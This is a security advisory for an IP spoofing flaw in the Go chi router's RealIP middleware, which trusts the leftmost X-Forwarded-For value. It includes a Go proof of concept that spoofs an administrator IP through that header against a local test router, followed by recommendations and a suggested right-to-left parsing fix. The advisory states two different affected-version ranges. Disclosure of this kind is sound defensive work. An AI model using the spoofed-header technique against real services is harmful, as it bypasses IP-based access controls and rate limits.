# [M] chi Has an IP Spoofing Vulnerability in `middleware.RealIP`

## Summary
Severity: Medium
Advisory: GHSA-3fxj-6jh8-hvhx
CWE: CWE-290, CWE-345
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-3fxj-6jh8-hvhx
Type: github-advisory

## Affected
- Go: `github.com/go-chi/chi/v5/middleware` — affected >=5.2.1 <5.3.0

## Details
## Summary
The `RealIP` middleware in `go-chi/chi` is vulnerable to IP spoofing because it blindly trusts the first (leftmost) element of the `X-Forwarded-For` HTTP header. This allows a remote attacker to bypass IP-based access control lists (ACLs) and rate-limiting mechanisms by providing a spoofed IP address in the header.

## Details
In `middleware/realip.go`, the `realIP` function parses the `X-Forwarded-For` header and extracts the first comma-separated value:

```go
func realIP(r *http.Request) string {
    // ...
    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
        ip, _, _ = strings.Cut(xff, ",")
    }
    // ...
}
```

Standard practice for `X-Forwarded-For` is that each proxy appends the client's IP to the end of the list. However, since the client can also provide this header, the leftmost values are untrusted. A client can send a header like `X-Forwarded-For: <spoofed_ip>, <actual_proxy_ip>`, and `go-chi/chi` will treat `<spoofed_ip>` as the source of the request.

## Proof of Concept (PoC)
The following code demonstrates how an attacker can bypass an IP-based restriction.

```go
package main

import (
        "fmt"
        "net/http"
        "net/http/httptest"

        "github.com/go-chi/chi/v5"
        "github.com/go-chi/chi/v5/middleware"
)

func main() {
        r := chi.NewRouter()

        // Enable the vulnerable RealIP middleware
        r.Use(middleware.RealIP)

        // An endpoint that should be restricted to a specific administrator IP (1.2.3.4)
        r.Get("/admin/secret", func(w http.ResponseWriter, r *http.Request) {
                clientIP := r.RemoteAddr
                fmt.Printf("[Server] Request received from IP: %s\n", clientIP)

                // Simulate IP-based access control
                if clientIP == "1.2.3.4" {
                        w.WriteHeader(http.StatusOK)
                        w.Write([]byte("CONFIDENTIAL: The secret code is 42\n"))
                } else {
                        w.WriteHeader(http.StatusForbidden)
                        w.Write([]byte("Access Denied: You are not an administrator.\n"))
                }
        })

        // --- Attack Simulation ---
        fmt.Println("--- PoC: IP Spoofing Attack on chi/middleware.RealIP ---")

        // 1. Normal Request (Should be denied)
        req1, _ := http.NewRequest("GET", "/admin/secret", nil)
        rr1 := httptest.NewRecorder()
        r.ServeHTTP(rr1, req1)
        fmt.Printf("[Client] Normal Request -> Status: %d, Body: %s", rr1.Code, rr1.Body.String())

        // 2. Spoofed Request (Using X-Forwarded-For)
        // Attacker claims to be '1.2.3.4'
        req2, _ := http.NewRequest("GET", "/admin/secret", nil)
        req2.Header.Set("X-Forwarded-For", "1.2.3.4, 5.6.7.8") // 5.6.7.8 is a fake proxy IP
        rr2 := httptest.NewRecorder()
        r.ServeHTTP(rr2, req2)
        fmt.Printf("[Client] Spoofed Request -> Status: %d, Body: %s", rr2.Code, rr2.Body.String())
}
```

## Impact
An attacker can masquerade as any IP address. This can lead to:
- **Bypass of Authentication/Authorization:** Accessing administrative panels or private APIs restricted by IP.
- **Rate Limiting Evasion:** Circumbeting rate limiters that use `RemoteAddr` as a key.
- **Log Forgery:** Causing incorrect IP addresses to be recorded in security logs.

## CWE
- **CWE-290:** Authentication Bypass by Spoofing
- **CWE-345:** Insufficient Verification of Data Authenticity

## CVSS Score
- **CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N** (6.9 Moderate)

## Affected Versions
- `github.com/go-chi/chi/v5` <= `v5.2.1` (and all previous versions)

## Recommendation
1.  **Stop using `middleware.RealIP`** if you cannot guarantee that the incoming request headers are from a trusted source and have been sanitized by a proxy.
2.  Implement a trust-based IP extraction mechanism that verifies the chain of proxies.
3.  Use the `X-Forwarded-For` header by traversing it from **right to left** and stopping at the first IP address that is not in your list of trusted proxies.

## Suggested Fix
A secure implementation of `RealIP` should allow developers to specify a list of trusted proxy IP ranges (CIDRs). Below is a conceptual example of how to fix this by traversing the `X-Forwarded-For` header from right to left:

```go
func GetClientIP(r *http.Request, trustedProxies []net.IPNet) string {
        xff := r.Header.Get("X-Forwarded-For")
        if xff == "" {
                return r.RemoteAddr
        }

        ips := strings.Split(xff, ",")
        // Traverse from right to left
        for i := len(ips) - 1; i >= 0; i-- {
                ipStr := strings.TrimSpace(ips[i])
                ip := net.ParseIP(ipStr)
                if ip == nil {
                        continue
                }

                if !isTrustedProxy(ip, trustedProxies) {
                        return ipStr
                }
        }

        return r.RemoteAddr
}

func isTrustedProxy(ip net.IP, trustedProxies []net.IPNet) bool {
        for _, network := range trustedProxies {
                if network.Contains(ip) {
                        return true
                }
        }
        return false
}
```

By providing a configuration like `middleware.RealIPWithConfig(Config{TrustedProxies: []string{"10.0.0.0/8"}})` , the middleware can safely identify the true client IP even in complex proxy environments.

## References
- https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx
- https://github.com/go-chi/chi
